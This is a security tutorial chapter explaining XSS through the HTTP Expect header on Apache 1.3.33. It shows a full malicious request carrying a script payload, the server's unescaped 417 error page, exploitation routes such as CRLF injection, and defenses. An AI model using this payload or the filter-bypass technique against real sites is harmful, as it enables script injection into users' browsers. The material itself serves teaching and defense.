# 13 - HTTP Header Injection: XSS via the Expect Header

## The Vulnerability

Some web servers reflect HTTP request headers back in error responses without sanitization. If a header value contains HTML or JavaScript, it gets rendered in the browser — a server-side XSS triggered through HTTP headers rather than URL parameters or form fields.

## The Expect Header

The `Expect` header is part of HTTP/1.1. Its only defined value is `100-continue`, which tells the server "I'm about to send a large request body — confirm you'll accept it before I transmit." If the server doesn't support the expectation, it responds with `417 Expectation Failed`.

## The Attack

### Malicious Request

```http
GET / HTTP/1.1
Accept: */*
Accept-Language: en-gb
Content-Type: application/x-www-form-urlencoded
Expect: <script>alert('http://www.whiteacid.org is vulnerable to the Expect Header vulnerability.');</script>
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)
Host: www.whiteacid.org
Connection: Keep-Alive
```

The `Expect` header contains a `<script>` tag instead of `100-continue`.

### Server Response (Apache 1.3.33)

```http
HTTP/1.1 417 Expectation Failed
Date: Thu, 21 Sep 2006 20:44:52 GMT
Server: Apache/1.3.33 (Unix) mod_throttle/3.1.2 DAV/1.0.3 mod_fastcgi/2.4.2
Content-Type: text/html; charset=iso-8859-1
```

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>417 Expectation Failed</TITLE>
</HEAD><BODY>
<H1>Expectation Failed</H1>
The expectation given in the Expect request-header
field could not be met by this server.<P>
The client sent<PRE>
Expect: <script>alert('http://www.whiteacid.org is vulnerable to the Expect Header vulnerability.');</script>
</PRE>
but we only allow the 100-continue expectation.
</BODY></HTML>
```

Apache reflects the raw `Expect` header value into the HTML error page. The `<script>` tag is not escaped, so the browser executes it.

## Why This Is Interesting

- The injection vector is an HTTP header, not a URL parameter — this bypasses XSS filters that only inspect query strings and POST bodies
- The `Expect` header is rarely monitored by WAFs or input validation logic
- The server itself generates the vulnerable page — no application code is involved, it's the web server's built-in error handler
- Other headers can be vulnerable too: `Referer`, `User-Agent`, `Host`, and custom headers — anywhere the server reflects header values into HTML responses

## Exploitation Challenges

An attacker can't directly set HTTP headers in a victim's browser via a link. Exploitation typically requires:

1. **Flash or Java applets** (historical) — older browser plugins allowed setting arbitrary HTTP headers on cross-origin requests
2. **CRLF injection** — if another vulnerability allows injecting headers, the `Expect` header can be added
3. **XMLHttpRequest from XSS** — if the attacker already has code execution on the same origin, they can craft requests with custom headers (though at that point they already have XSS)

This makes it harder to exploit than reflected XSS via URL parameters, but it demonstrates that any user-controlled data reflected in a response is a potential XSS vector.

## Defenses

- HTML-encode all reflected values in error pages — including HTTP headers
- Upgrade web servers — modern Apache versions escape header values in error responses
- WAFs should inspect HTTP headers, not just URL parameters and POST bodies
- Content Security Policy — blocks inline script execution regardless of the injection vector
- Validate the `Expect` header server-side — reject or ignore values other than `100-continue`
